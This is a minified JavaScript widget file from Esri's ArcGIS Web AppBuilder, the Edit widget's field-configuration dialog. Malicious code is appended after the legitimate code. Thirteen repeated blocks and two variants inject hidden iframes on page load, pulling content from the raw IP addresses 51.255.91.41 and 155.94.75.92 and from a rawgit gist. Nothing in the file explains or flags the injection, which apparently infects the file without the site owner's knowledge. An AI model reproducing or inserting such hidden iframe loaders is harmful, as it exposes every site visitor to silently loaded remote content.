// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Edit/setting/EditFields.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"fieldsTable"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/text!./EditFields.html dijit/_TemplatedMixin jimu/BaseWidgetSetting jimu/dijit/SimpleTable jimu/dijit/Popup".split(" "),function(e,c,d,f,g,h,k,l){return e([h,g],{baseClass:"jimu-widget-edit-setting-fields",templateString:f,_layerInfo:null,postCreate:function(){this.inherited(arguments);this.nls=c.mixin(this.nls,window.jimuNls.common);this._initFieldsTable();this._setFiedsTabele(this._layerInfo.fieldInfos)},popupEditPage:function(){var b=
new l({titleLabel:this.nls.configureFields,width:700,maxHeight:600,autoHeight:!0,content:this,buttons:[{label:this.nls.ok,onClick:c.hitch(this,function(){this._resetFieldInfos();b.close()})},{label:this.nls.cancel,classNames:["jimu-btn-vacation"],onClick:c.hitch(this,function(){b.close()})}],onClose:c.hitch(this,function(){})})},_initFieldsTable:function(){this._fieldsTable=new k({fields:[{name:"visible",title:this.nls.display,type:"checkbox","class":"display",width:"25%"},{name:"isEditable",title:this.nls.edit,
type:"checkbox","class":"editable",width:"25%"},{name:"fieldName",title:this.nls.editpageName,type:"text",width:"14%"},{name:"label",title:this.nls.editpageAlias,type:"text",editable:!0,width:"18%"},{name:"actions",title:this.nls.actions,type:"actions",actions:["up","down"],"class":"actions",width:"18%"}],selectable:!1,style:{height:"300px",maxHeight:"300px"}});this._fieldsTable.placeAt(this.fieldsTable);this._fieldsTable.startup()},_setFiedsTabele:function(b){d.forEach(b,function(a){this._fieldsTable.addRow({fieldName:a.fieldName,
isEditable:a.isEditable,label:a.label,visible:a.visible})},this);setTimeout(c.hitch(this,function(){d.forEach(this._fieldsTable.fields,function(a){"visible"===a.name?a.onChange=c.hitch(this,this._onDisplayFieldChanged):"isEditable"===a.name&&(a.onChange=c.hitch(this,this._onIsEditableFieldChanged))},this)}),300)},_onDisplayFieldChanged:function(b){var a=this._fieldsTable.getRowData(b);!a.visible&&a.isEditable&&(a.isEditable=!1,this._fieldsTable.editRow(b,a))},_onIsEditableFieldChanged:function(b){var a=
this._fieldsTable.getRowData(b);a.isEditable&&!a.visible&&(a.visible=!0,this._fieldsTable.editRow(b,a))},_resetFieldInfos:function(){var b=[],a=this._fieldsTable.getData();d.forEach(a,function(a){b.push({fieldName:a.fieldName,label:a.label,isEditable:a.isEditable,visible:a.visible})});this._layerInfo.fieldInfos=b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});